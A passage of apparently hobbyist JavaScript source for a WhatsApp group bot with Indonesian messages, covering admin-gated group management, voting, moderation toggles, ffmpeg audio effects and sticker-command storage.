if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isAdmins && !isCreator) return m.reply(mess.admin)
  await liaacans.groupRevokeInvite(m.chat)
  m.reply(`SUKSES RESET LINK GRUP`)
  }
  break
case 'kick': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(`Sukses Kick Member Tidak Berguna`))
}
break
case 'add': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(`Sukses Add Member Berguna`))
}
break
case 'promote': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(`Sukses Member Sebagai Admin`))
}
break
case 'demote': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(`Sukses Admin Sebagai Member`))
}
break
case 'setname': case 'setsubject': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Teks Nya Mana Bos ?'
await liaacans.groupUpdateSubject(m.chat, text).then((res) => m.reply(`Sukses Setname Grup Ini!`))
}
break
case 'setdesc': case 'setdesk': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Teks Nya Mana Bos ?'
await liaacans.groupUpdateDescription(m.chat, text).then((res) => m.reply(`Sukses Setdesc Grup Ini`))
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await liaacans.downloadAndSaveMediaMessage(quoted)
await liaacans.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
case 'tagall': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isAdmins && !isCreator) throw mess.admin
let teks = `──── ⌜ Tag All ⌟ ────
 
 ❗ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
liaacans.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fkontak })
}
break
case 'hidetag': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!isAdmins && !isCreator) throw mess.admin
if (!m.isGroup) throw mess.group
liaacans.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id) }, { quoted: fkontak })
}

break
case 'vote': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageVote = {
text: teks_vote,
footer: creator,
buttons: buttonsVote,
headerType: 1
}
liaacans.sendMessage(m.chat, buttonMessageVote)
}
break
case 'upvote': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsUpvote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageUpvote = {
text: teks_vote,
footer: creator,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
}
liaacans.sendMessage(m.chat, buttonMessageUpvote)
}
break
case 'devote': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsDevote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageDevote = {
text: teks_vote,
footer: creator,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
}
liaacans.sendMessage(m.chat, buttonMessageDevote)
}
break
case 'cekvote':
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${liaacans.user.id}
`
liaacans.sendTextWithMentions(m.chat, teks_vote, m)
break
case 'deletevote': case'delvote': case 'hapusvote': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
delete vote[m.chat]
m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
}
break
case 'group': case 'grup': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'close'){
await liaacans.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await liaacans.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`))
} else {
m.reply(`Pilih open atau close\nContoh : ${prefix}group open`)
}
}
break
case 'editinfo': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'open'){
await liaacans.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'close'){
await liaacans.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`))
} else {
m.reply(`Pilih open atau close\nContoh : ${prefix}editinfo open`)
}
}
break
case 'antilink': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = true
m.reply(`Antilink Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = false
m.reply(`Antilink Tidak Aktif !`)
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}antilink on`)
}
}
break
case 'antivirtex': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antivirtex) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antivirtex = true
m.reply(`antivirtex Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antivirtex) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antivirtex = false
m.reply(`antivirtex Tidak Aktif !`)
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}antivirtex on`)
}
}
break
case 'antibadword': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antibadword) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antibadword = true
m.reply(`Antibadword Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antibadword) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antibadword = false
m.reply(`Antibadword Tidak Aktif !`)
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}antibadword on`)
}
}
break
case 'antilinkig': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkig = true
m.reply(`Antilink Insta Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkig = false
m.reply(`Antilink Insta Tidak Aktif !`)
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}antilinkig on`)
}
}
break
case 'antiviewonce': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
if (args[0] === "on") {
if (db.data.chats[m.chat].antiviewonce) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antiviewonce = true
m.reply(`Antiviewonce Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiviewonce) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antiviewonce = false
m.reply(`Antiviewonce Tidak Aktif !`)
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}antiviewonce on`)
}
}
break
case 'antiwame': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antiwame) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antiwame = true
m.reply(`Antiwame Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiwame) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antiwame = false
m.reply(`Antiwame Tidak Aktif !`)
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}antiwame on`)
}
}
break
case 'autosticker':
            case 'autostiker':
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0]  === 'on'){
if (isAutoSticker) return m.reply(`Already activated`)
autosticker.push(m.chat)
fs.writeFileSync('./json/autosticker.json', JSON.stringify(autosticker))
m.reply('autosticker activated')
} else if (args[0] === 'off'){
let anu = autosticker.indexOf(m.chat)
autosticker.splice(anu, 1)
fs.writeFileSync('./json/autosticker.json', JSON.stringify(autosticker))
m.reply('auto sticker deactivated')
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}autosticker on`)
}
break
case 'autostickerpc':
            case 'autostikerpc':
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (m.isGroup) throw mess.private
if (args[0]  === 'on'){
if (isAutoStick) return m.reply(`Already activated`)
_autostick.push(m.chat)
fs.writeFileSync('./json/autostickpc.json', JSON.stringify(autosticker))
m.reply('autosticker pc activated')
} else if (args[0] === 'off'){
let anu = autosticker.indexOf(m.chat)
_autostick.splice(anu, 1)
fs.writeFileSync('./json/autostickpc.json', JSON.stringify(autosticker))
m.reply('autosticker pc deactivated')
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}autostickerpc on`)
}
break
case 'mute': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins && !isCreator) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
m.reply(`${liaacans.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
m.reply(`${liaacans.user.name} telah di unmute di group ini !`)
} else {
m.reply(`pilih off atau on\ncontoh : ${prefix}mute on`)
}
}
break
case 'linkgroup': case 'linkgc': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
let response = await liaacans.groupInviteCode(m.chat)
liaacans.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'ephemeral': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await liaacans.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await liaacans.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'igcertificate': case 'ytcertificate': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                liaacans.sendMessage(m.chat, { image: { url: api('liaacans', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
case 'blackpink': {
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
      if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                liaacans.sendMessage(m.chat, { image: { url:  fetchJson('https://restapi-liaacans.herokuapp.com/api/textpro/black-pink?text=Revita&apikey=APIKEY') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await liaacans.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                liaacans.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                liaacans.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
            if (cekUser("id", m.sender) == null) return liaacans.sendButtonText(m.chat, [{ buttonId: 'Daftar', buttonText: { displayText: 'DAFTAR' }, type: 1 }], `「 REGISTRASI 」\n\nSilahkan Daftar Terlebih Dahulu\nTekan button dibawah atau ketik #daftar`, creator, m)
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
